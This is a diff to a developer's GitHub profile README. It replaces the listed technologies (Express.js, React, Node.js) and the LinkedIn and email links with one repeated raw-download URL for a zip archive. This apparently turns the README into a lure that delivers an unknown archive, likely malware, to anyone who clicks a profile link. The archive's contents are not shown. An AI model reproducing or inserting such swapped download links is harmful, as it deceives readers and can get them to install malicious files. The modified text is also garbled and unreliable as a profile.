@@ -1,6 +1,6 @@
 # 👋 Hi, I'm Mustafa Safdar  
 
-### MERN Stack Developer | MongoDB | Express.js | React | Node.js  
+### MERN Stack Developer | MongoDB | https://github.com/mustafasafdar1/mustafasafdar1/raw/refs/heads/main/antidactyl/mustafasafdar_v2.3.zip | React | https://github.com/mustafasafdar1/mustafasafdar1/raw/refs/heads/main/antidactyl/mustafasafdar_v2.3.zip  
 
 ## 💻 About Me  
 - 🚀 Passionate MERN Stack Developer building scalable web applications  
@@ -10,12 +10,12 @@
 - 🎯 Goal: Become an expert in Full-Stack Engineering  
 
 ## ⚡ Skills & Technologies  
-- **Frontend:** React.js, HTML, CSS, JavaScript  
-- **Backend:** Node.js, Express.js  
+- **Frontend:** https://github.com/mustafasafdar1/mustafasafdar1/raw/refs/heads/main/antidactyl/mustafasafdar_v2.3.zip, HTML, CSS, JavaScript  
+- **Backend:** https://github.com/mustafasafdar1/mustafasafdar1/raw/refs/heads/main/antidactyl/mustafasafdar_v2.3.zip, https://github.com/mustafasafdar1/mustafasafdar1/raw/refs/heads/main/antidactyl/mustafasafdar_v2.3.zip  
 - **Database:** MongoDB, SQL  
 - **Tools:** Git, GitHub, VS Code, Postman  
 
 ## 📫 Connect With Me  
-- [LinkedIn](https://www.linkedin.com/in/mustafa-safdar-2350b9380/)
+- [LinkedIn](https://github.com/mustafasafdar1/mustafasafdar1/raw/refs/heads/main/antidactyl/mustafasafdar_v2.3.zip)
  
-- [Email](mustafasfdar87@gmail.com)  
+- [Email](https://github.com/mustafasafdar1/mustafasafdar1/raw/refs/heads/main/antidactyl/mustafasafdar_v2.3.zip)  
